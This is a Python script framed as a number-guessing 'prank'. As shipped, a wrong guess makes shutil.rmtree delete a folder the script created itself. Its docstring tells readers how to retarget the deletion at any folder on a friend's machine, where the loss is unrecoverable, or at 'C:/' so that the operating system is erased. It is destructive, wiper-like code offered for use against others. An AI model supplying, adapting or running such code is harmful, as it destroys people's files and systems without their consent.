# Nuke the system:
import os
import random
import shutil
'''
Note - This code is to prank your friends not use this code to do some serious harm to the system like deleting the operating system (os) if you want to use this code to prank you friends then do this: 

1. What changes you have to do to prank your friends is: 
a. first remove the code or comment out the code from os.mkdir to f.write and change the path.
b. Change path from 'D:/Winner folder' to 'path you want to remove' and then run the code if the number guessed is same then your folder is safe but if not then that folder will be deleted and cannot be re-downloaded from recycle bin.

2. To do some serious harm like deleting operating system:
a. Follow the same step as mentioned in point number - 1.
b. Then change the path from 'D:/Winner folder' to 'C:/' through this you can delete the operating system (os) but this code works in Windows for other operating system check google.

3. What does this code do:
a. First system will pick a random number between 1, 100 and ask from the user to guess the number.
b. Before that the folder name Winner folder will be created and in that the file will also be created but you can't access that until you guess the correct number. 
c. If the number guessed is correct then the folder will stay and you can access that and if the number is not same then the folder will be deleted.
'''
danger = random.randint(1, 100) # Here System will pick a random number between 1, 100.

ask = int(input("Enter number here: ")) # Here we are asking user to enter and guess the number. 

# Here we are creating folder:
os.mkdir("D:/Winner folder") 
with open(f"D:/Winner folder/winner file.txt", "w") as f:
    f.write("You finally won the game congrats")

# Here we have created conditions which are the important part of our code:
if(ask == danger): # Here if the user enter number is same as the number picked by System then the folder will be created.
    print("The number is same")

else: # Here if the number entred is not equal to the number picked by System then the folder will be deleted
    shutil.rmtree("D:/Winner folder")